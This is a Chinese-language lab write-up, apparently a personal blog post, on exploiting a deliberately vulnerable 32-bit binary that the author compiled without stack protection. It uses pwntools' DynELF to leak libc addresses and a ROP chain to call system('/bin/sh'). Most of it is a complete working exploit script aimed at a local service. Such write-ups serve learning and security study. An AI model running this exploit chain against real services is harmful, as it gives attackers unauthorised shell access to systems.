---
layout: post
title: "[pwn] DynELF && ROP"
categories: "BinarySecurity"
---

#### 0x00 前言 ####

- 环境： kali 2016.2  32位
- 工具： pwntools peda

安全机制只开启了NX和ASLR，其他都关闭

	echo 2 > /proc/sys/kernel/randomized_va_space

	gcc -g -fno-stack-protector -o vul vul.c

vul.c的内容同[ret2libc && ROP](https://pench3r.github.io/2018/03/30/ret2libc-rop.html)中使用的相同。

#### 0x01 漏洞利用 ####

在[ret2libc && ROP](https://pench3r.github.io/2018/03/30/ret2libc-rop.html)我们介绍的ROP方法，是通过获取到程序使用的对应so文件，计算函数的偏移，再配合泄漏出一个函数的内存地址，可以计算出`system`的地址和`/bin/sh`的字符串地址，最后构造`ROP`获取`shell`

但是有些情况下我们并无法获取到程序所使用的`so`库文件，此时我们可以借用`pwntools`中提供的`DynELF`模块进行内存地址的爆破，前提是我们可以控制目标程序去泄漏内存地址(这个是关键)，漏洞的原理还是和[ret2libc && ROP](https://pench3r.github.io/2018/03/30/ret2libc-rop.html)一样。

利用脚本的核心为：

<pre>e = DynELF(leak, elf=ELF('./vul'))   # 初始化DynELF模块</pre>

其中的leak为主要的暴力破解的函数

<pre>def leak(address):
    payload = "A"*payload_len + p32(write_plt_addr) + p32(main) + p32(1) + p32(address) + p32(4)
    p.send(payload)
    data = p.recv(4)
    log.debug("%#x => %s" % (address, (data or '').encode('hex')))
    return data</pre>

最后使用`lookup`来破解需要的函数地址

<pre>e.lookup('__libc_system', 'libc')</pre>


整合的利用脚本：

<pre>#!/usr/bin/python

from pwn import *

#p = process('./vul')
p = remote('127.0.0.1', 10000)
elf = ELF('./vul')

# debug
#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
#gdb.attach(proc.pidof(p)[0])

payload_len = 140
write_plt_addr = elf.plt['write']
read_plt_addr = elf.plt['read']
main = elf.symbols['main']
print "[*] main address is " + hex(main)
vul_addr = elf.symbols['vul_func']
print "[*] vul_func address is " + hex(vul_addr)

def leak(address):
    payload = "A"*payload_len + p32(write_plt_addr) + p32(main) + p32(1) + p32(address) + p32(4)
    p.send(payload)
    data = p.recv(4)
    log.debug("%#x => %s" % (address, (data or '').encode('hex')))
    return data

d = DynELF(leak, elf=elf)
system_addr = d.lookup('__libc_system', 'libc')
print "[+] Use DynELF to search system address is " + hex(system_addr)

buff_addr = elf.symbols['__bss_start']
pppr_addr = 0x080484d9  # pop esi ; pop edi ; pop ebp ; ret
exit_addr = 0xdeadbeef

payload2 = "A"*payload_len + p32(read_plt_addr) + p32(pppr_addr) + p32(0) + p32(buff_addr) + p32(8)
payload2 += p32(system_addr) + p32(exit_addr) + p32(buff_addr)

print "[*] Begin to get shell...\n"
p.send(payload2)
sleep(1)
p.send("/bin/sh\0")

p.interactive()</pre>

ps: 本地测试的时候，一直无法运行成功，后来发现原因是由于leak函数中`payload = "A"*payload_len + p32(write_plt_addr) + p32(main) + p32(1) + p32(address) + p32(4)`，`p32(main)`不能设置为`p32(vul_func)`,目前不太肯定到底是什么原因，个人猜测可能是涉及到堆栈的一些问题。

#### 0x02 总结 ####

这篇文章中只介绍了DynELF模块的基本使用方法，对于漏洞原理并没有过多的解释，可以通过[ret2libc && ROP](https://pench3r.github.io/2018/03/30/ret2libc-rop.html)做深入理解。
